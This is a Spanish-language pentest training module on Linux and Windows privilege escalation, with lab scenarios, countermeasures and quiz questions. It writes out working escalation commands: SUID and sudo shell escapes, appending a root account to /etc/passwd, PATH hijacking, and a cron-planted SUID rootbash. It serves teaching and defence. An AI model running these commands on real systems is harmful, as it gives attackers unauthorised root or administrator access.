
# Privilege Escalation - Técnicas Avanzadas

## 🎯 Objetivo
Dominar las técnicas de escalada de privilegios en sistemas Linux y Windows para obtener acceso administrativo.

## 🐧 Linux Privilege Escalation

### 1. SUID/SGID Binaries
```bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Buscar binarios SGID
find / -perm -2000 -type f 2>/dev/null

# Explotar SUID bash
/bin/bash -p
```

### 2. Sudo Misconfigurations
```bash
# Verificar permisos sudo
sudo -l

# Explotar sudo sin password
sudo /usr/bin/vim
:!/bin/sh

# GTFOBins para bypass
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

### 3. Kernel Exploits
```bash
# Verificar versión del kernel
uname -a
cat /proc/version

# Buscar exploits conocidos
searchsploit kernel ubuntu
```

### 4. Cron Jobs
```bash
# Verificar cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### 5. Writable /etc/passwd
```bash
# Verificar permisos
ls -la /etc/passwd

# Crear usuario root
echo 'hacker:$1$hacker$TzyKlv0/8Y8mKs6K6fGOg/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## 🪟 Windows Privilege Escalation

### 1. Unquoted Service Paths
```cmd
# Buscar servicios vulnerables
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# Verificar permisos de escritura
accesschk.exe -uwcqv "Authenticated Users" *
```

### 2. AlwaysInstallElevated
```cmd
# Verificar registro
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 3. Stored Credentials
```cmd
# Buscar credenciales almacenadas
cmdkey /list
runas /savecred /user:administrator cmd.exe
```

### 4. DLL Hijacking
```cmd
# Buscar DLLs faltantes
procmon.exe
```

## 🛠️ Herramientas de Automatización

### Linux
- **LinPEAS**: Automated privilege escalation scanner
- **Linux Exploit Suggester**: Kernel exploit recommendations
- **pspy**: Process monitoring without root

### Windows
- **WinPEAS**: Windows privilege escalation scanner
- **PowerUp**: PowerShell privilege escalation script
- **Seatbelt**: Security-oriented enumeration

## 🧪 Laboratorio Práctico

### Escenario 1: SUID Binary Exploitation
```bash
# Objetivo: Explotar /usr/bin/find con SUID
find /home -exec /bin/sh \; -quit
```

### Escenario 2: Sudo PATH Manipulation
```bash
# Crear binario malicioso
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo ls
```

### Escenario 3: Writable Script in Cron
```bash
# Modificar script ejecutado por cron
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
# Esperar ejecución del cron
/tmp/rootbash -p
```

## 🛡️ Contramedidas

### Linux
- Audit SUID/SGID binaries regularly
- Restrict sudo access with proper configuration
- Keep kernel updated
- Monitor cron jobs and file permissions
- Implement proper file system permissions

### Windows
- Quote all service paths
- Disable AlwaysInstallElevated
- Secure stored credentials
- Implement proper DLL loading
- Use Windows Defender or equivalent AV

## 📚 Recursos Adicionales
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- HackTricks PrivEsc: https://book.hacktricks.xyz/
- PayloadsAllTheThings

## ✅ Verificación de Conocimientos
1. ¿Qué es un binario SUID y cómo se puede explotar?
2. ¿Cómo identificar servicios Windows vulnerables?
3. ¿Qué herramientas automatizadas recomendarías?
4. ¿Cómo prevenir escaladas de privilegios?
